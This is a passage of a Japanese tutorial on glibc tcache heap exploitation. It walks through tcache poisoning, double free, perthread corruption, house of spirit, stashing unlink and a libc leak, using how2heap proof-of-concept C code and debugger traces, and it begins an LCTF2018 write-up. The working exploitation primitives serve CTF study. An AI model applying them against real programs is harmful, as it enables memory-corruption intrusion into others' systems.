03:0018│          0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp      0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│          0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│          0x7fffffffdfd0 ?— 0x0
07:0038│          0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> i r rax
rax            0x7fffffffdfa8	140737488347048
```
`tcache posioning` はこの手法が fastbin attack に似ていますが、size の制限がないため、より広い範囲で使えることが分かります。

#### tcache dup
`fastbin dup` に似ていますが、利用するのは `tcache_put()` の厳密でなさです。
```C
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
`tcache_put()` のチェックも無視できるほどであり(`tcache->counts[tc_idx]` に対するチェックすらありません)、性能を大幅に高めた一方で、安全性もかなり低下したことが分かります。

チェックが一切ないので、同じチャンクを何度も free でき、循環リスト(cycliced list)を作れます。

how2heap の [tcache_dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) を例に解析します。ソースコードは次のとおりです。
```C
glibc_2.26 [master●] bat ./tcache_dup.c 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: ./tcache_dup.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ 
   4   │ int main()
   5   │ {
   6   │         fprintf(stderr, "This file demonstrates a simple double-free attack with
       │  tcache.\n");
   7   │ 
   8   │         fprintf(stderr, "Allocating buffer.\n");
   9   │         int *a = malloc(8);
  10   │ 
  11   │         fprintf(stderr, "malloc(8): %p\n", a);
  12   │         fprintf(stderr, "Freeing twice...\n");
  13   │         free(a);
  14   │         free(a);
  15   │ 
  16   │         fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
  17   │         fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", ma
       │ lloc(8), malloc(8));
  18   │ 
  19   │         return 0;
  20   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

デバッグしてみます。1回目の free です。
```asm
pwndbg> n
14		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x1
 R8   0x0
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x5555555547fc (main+162) ?— mov    rax, qword ptr [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547e4 <main+138>    lea    rdi, [rip + 0x171]
   0x5555555547eb <main+145>    call   fwrite@plt <0x555555554630>
 
   0x5555555547f0 <main+150>    mov    rax, qword ptr [rbp - 0x18]
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
 ? 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
   0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
    9 	int *a = malloc(8);
   10 
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
 ? 14 	free(a);
   15 
   16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260
```
tcache の最初のリストにチャンクが1つ入りました。

2回目の free では、free するのは同じチャンクですが、`tcache_put()` が何もチェックしないため、プログラムは crash しません。
```asm
pwndbg> n
16		fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x555555756260 ?— 0x555555756260 /* '`buUUU' */
 RDI  0x2
 RSI  0x555555756010 ?— 0x2
 R8   0x1
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x555555554808 (main+174) ?— mov    rax, qword ptr [rip + 0x200851]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
   0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
 ? 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
   0x555555554817 <main+189>    lea    rsi, [rip + 0x152]
   0x55555555481e <main+196>    mov    rdi, rax
   0x555555554821 <main+199>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
   14 	free(a);
   15 
 ? 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
   20 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x555555756260 /* '`buUUU' */
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260 --> 0x555555756260 (overlap chunk with 0x555555756250(freed) )
```
この手法は `fastbin dup` に比べてもずっと簡単であることが分かります。

#### tcache perthread corruption
`tcache_perthread_struct` が tcache 全体の管理構造であることはすでに分かっています。この構造体を制御できれば、malloc する size が何であっても、アドレスを制御できます。

あまり良い例が見つからなかったので、自分で1つの状況を考えました。

次のようなヒープの配置を想定します。
```
tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |--------->+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
何らかの手段(たとえば `tcache posioning`)で、これを次のように書き換えたとします。
```
tcache_    +------------+<---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |--------->+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
こうすると、2回の malloc で `tcache_perthread_struct` のアドレスが返ってくるので、tcache 全体を制御できます。

**tcache_perthread_struct もヒープ上にあるため、この手法は通常、partial overwrite だけで目的を達成できます。**



#### tcache house of spirit

how2heap のソースコードで説明します。

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	fprintf(stderr, "Ok. Let's start with the example!.\n\n");


	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```



攻撃後の目的は、スタック上の内容を制御することです。チャンクを1つ malloc し、スタック上に fake したチャンクを free すると、次のことが分かります。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x4052e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffe510 --> 0x401340
```



Tcache にスタック上の内容が1ブロック入っています。あとは malloc するだけで、このメモリを制御できます。

#### smallbin unlink

smallbin に空きブロックが含まれているとき、同じサイズのほかの空きブロックも同時に tcache に入れられます。このときリストからの取り外し(unlink)の操作も発生しますが、unlink マクロと比べるとリストの整合性チェックが欠けています。そのため、本来の unlink の操作もこの条件下では使えます。

#### tcache stashing unlink attack

この攻撃が利用するのは、tcache bin に空きがある(数が `TCACHE_MAX_BINS` 未満)とき、同じサイズの small bin が tcache に入れられるという挙動です(この状況は、同じサイズのヒープブロックを `calloc` で確保すると引き起こせます。`calloc` はヒープブロックを確保するとき tcache bin から選ばないためです)。`smallbin` 内のチャンクを1つ取得した後、tcache にまだ十分な空き位置があれば、残りの small bin を tcache にリンクします。この過程では最初の bin に対してのみ整合性チェックが行われ、後続のヒープブロックのチェックは欠けています。攻撃者が small bin の bk ポインタを書き込めるとき、任意のアドレスに libc のアドレスを書き込めます(`unsorted bin attack` に似た効果です)。うまく細工すれば、任意のアドレスに fake chunk を確保することもできます。

ここでは `how2heap` の `tcache_stashing_unlink_attack.c` を例にします。

解放された順に、`smallbin[sz]` 内の2つのチャンクをそれぞれ chunk0 と chunk1 と呼びます。chunk1 の `bk` を `fake_chunk_addr` に書き換えます。同時に、`fake_chunk_addr->bk` の位置にあらかじめ書き込み可能なアドレス `writable_addr` を書いておく必要があります。`calloc(size-0x10)` を呼び出すと、ユーザーには chunk0 が返されます(smallbin が `FIFO` で確保されるためです)。`tcache[sz]` に5個の空きヒープブロックがあるとすると、`chunk1` と `fake_chunk` を収容するのに十分な位置があります。ソースコード中のチェックでは、最初のチャンクのリストの整合性だけが `__glibc_unlikely (bck->fd != victim)` で検査され、後続のヒープブロックは入れる過程で検査されません。

tcache の確保は `LIFO` なので、`fake_chunk->bk` ポインタの位置にある `fake_chunk` は、tcache にリンクされるとき、かえってリストの先頭に置かれます。次に `malloc(sz-0x10)` を呼び出すと、ユーザーには `fake_chunk+0x10` が返されます。同時に、`bin->bk = bck;bck->fd = bin;` という unlink の操作によって、`writable_addr+0x10` の位置に libc のアドレスが書き込まれます。

```c

#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 tcache
    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);//>0x90

    //now 5 tcache bins
    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
    return 0;
}
```

この poc では、スタック上の配列で `fake_chunk` を模擬しています。まず、5個の `tcache chunk` と2個の `smallbin chunk` がある状況を作ります。`UAF` 脆弱性を模擬して `bin2->bk` を `fake_chunk` に書き換え、`calloc(0x90)` の時点で攻撃を発動させます。

`calloc` にブレークポイントを置き、呼び出す前のヒープブロックの配置を確認します。このとき `tcache[0xa0]` には5個の空きブロックがあります。chunk1->bk がすでに `fake_chunk_addr` に書き換えられていることが分かります。また `fake_chunk->bk` にも書き込み可能なアドレスが書かれています。`smallbin` は `bk` ポインタに従ってブロックを探すので、確保される順序は `0x0000000000603250->0x0000000000603390->0x00007fffffffdbc0 (FIFO)` になるはずです。calloc を呼び出すとユーザーには `0x0000000000603250+0x10` が返されます。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](5): 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x603390
0x603390:       0x0000000000000000      0x00000000000000a1
0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
gdb-peda$ x/4gx 0x00007fffffffdbc0
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
gdb-peda$ x/4gx 0x0000000000603250
0x603250:       0x0000000000000000      0x00000000000000a1
0x603260:       0x00007ffff7dcfd30      0x0000000000603390
gdb-peda$ x/4gx 0x00007ffff7dcfd30
0x7ffff7dcfd30 <main_arena+240>:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
0x7ffff7dcfd40 <main_arena+256>:        0x0000000000603390      0x0000000000603250
```

calloc を呼び出した後のヒープブロックの配置を確認すると、`fake_chunk` がすでに `tcache_entry[8]` にリンクされており、確保の順序が `LIFO` に変わったため、`0x7fffffffdbd0-0x10` のブロックがリストの先頭に引き上げられていることが分かります。次に `malloc(0x90)` すればこのブロックを得られます。

その fd は次の空きブロックを指しています。unlink の過程での `bck->fd=bin` という代入によって、`0x00007fffffffdbd0+0x10` の位置に libc のアドレスが書き込まれました。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](7): 0x7fffffffdbd0 --> 0x6033a0 --> 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
```

####  libc leak

以前の libc のバージョンでは、次のようにするだけでした。

```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	long *a = malloc(0x1000);
	malloc(0x10);
	free(a);
	printf("%p\n",a[0]);
} 
```



しかし 2.26 以降の libc のバージョンでは、まず tcache を満杯にする必要があります。

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc , char* argv[])
{
	long* t[7];
	long *a=malloc(0x100);
	long *b=malloc(0x10);
	
	// make tcache bin full
	for(int i=0;i<7;i++)
		t[i]=malloc(0x100);
	for(int i=0;i<7;i++)
		free(t[i]);
	
	free(a);
	// a is put in an unsorted bin because the tcache bin of this size is full
	printf("%p\n",a[0]);
} 
```

その後は libc を leak できます。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559af0 (size : 0x20510)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555559250 (size : 0x110)
(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
```



### 0x04 Tcache Check

最新の libc の [commit](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7) で、Tcache の double free に対するチェックが更新されました。

```c
index 6d7a6a8..f730d7a 100644 (file)
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
 typedef struct tcache_entry
 {
   struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
 } tcache_entry;
 
 /* There is one of these for each thread, which contains the
@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }
 
@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
   {
     size_t tc_idx = csize2tidx (size);
 
+    /* Check to see if it's already in the tcache.  */
+    tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+    /* This test succeeds on double free.  However, we don't 100%
+       trust it (it also matches random payload data at a 1 in
+       2^<size_t> chance), so verify it's not an unlikely coincidence
+       before aborting.  */
+    if (__glibc_unlikely (e->key == tcache && tcache))
+      {
+       tcache_entry *tmp;
+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+       for (tmp = tcache->entries[tc_idx];
+            tmp;
+            tmp = tmp->next)
+         if (tmp == e)
+           malloc_printerr ("free(): double free detected in tcache 2");
+       /* If we get here, it was a coincidence.  We've wasted a few
+          cycles, but don't abort.  */
+      }
+
     if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
```



今のところ、free の操作のときのチェックしか見つかっておらず、get に対する新しいチェックはないようです。

### 0x05 The pwn of CTF

#### Challenge 1 : LCTF2018 PWN easy_heap

##### 基本情報

リモート環境の libc は libc-2.27.so なので、ヒープブロックの確保と解放の過程では Tcache を考慮する必要があります。

```shell
zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
[*] '/home/zj/c_study/lctf2018/easy/easy_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

##### 基本機能

0. 入力関数: 1バイトずつループで読み込み、null バイトまたは改行文字が現れたら読み込みを止め、その後、現在の読み込み末尾の位置と size の位置をゼロにします。
1. new: `malloc(0xa8)` でブロックを1つ確保し、size を記録し、内容を入力します。
2. free: まず記録した size に従ってヒープブロックを `memset` でゼロクリアし、その後通常の free を行います。
3. show: puts で出力します。

機能はかなり単純です。

chunk の構造を記録する構造体:

```c
struct Chunk {
    char *content;
    int size;
};
```

ヒープ上に確保した構造で、すべての `Chunk` 構造体を記録しています。確保できるのは全部で10ブロックです。

プログラムの入力読み込み関数には null-byte-overflow 脆弱性があります。具体的には次のコードのとおりです。

```c
unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = 0;                                        
  if ( sz )
  {
    while ( 1 )
    {
      read(0, &malloc_p[i], 1uLL);
      if ( sz - 1 < i || !malloc_p[i] || malloc_p[i] == '\n' )
        break;
      ++i;
    }
    malloc_p[i] = 0;
    malloc_p[sz] = 0;                           // null-byte-overflow
  }
  else
  {
    *malloc_p = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
```

##### 悪用の考え方

tcache があるため、悪用の過程では tcache の存在を考慮する必要があります。

一般に、ヒーププログラムに null-byte-overflow 脆弱性が現れた場合は、overlapping heap chunk を作り、その overlapping chunk を何度も使えるようにして、情報漏えいを経て最終的に制御フローを奪うことを考えます。

null-byte-overflow 脆弱性の悪用方法は、オーバーフローで prev_in_use バイトを上書きしてヒープブロックを統合させ、偽造した prev_size フィールドを使って、統合の際にヒープブロックを交差させるものです。しかしこの問題では、入力関数が NULL 文字を入力できないため、prev_size に 0x_00 の値を入力できません。また、ヒープブロックの確保サイズは固定なので、null-byte-overflow の方法をそのまま使っても悪用できず、prev_size を書き込む別の方法が必要です。

prev_size を手動で書き込む方法がないのに、悪用には prev_size を使う必要がある場合は、システムが書き込む prev_size を使うことを考えます。

方法は次のとおりです。unsorted bin の統合時に prev_size が書き込まれ、その prev_size は(新しい prev_size を書き込む必要がない限り)簡単には上書きされません。そのため、その prev_size を悪用に使えます。

具体的な過程:

1. `A -> B -> C` の3つの unsorted bin chunk を順に解放する
2. A と B が統合され、このとき C の前の prev_size に 0x200 が書き込まれる
3. A、B、C が統合されても、手順 2 で書き込まれた 0x200 はそのまま保たれる
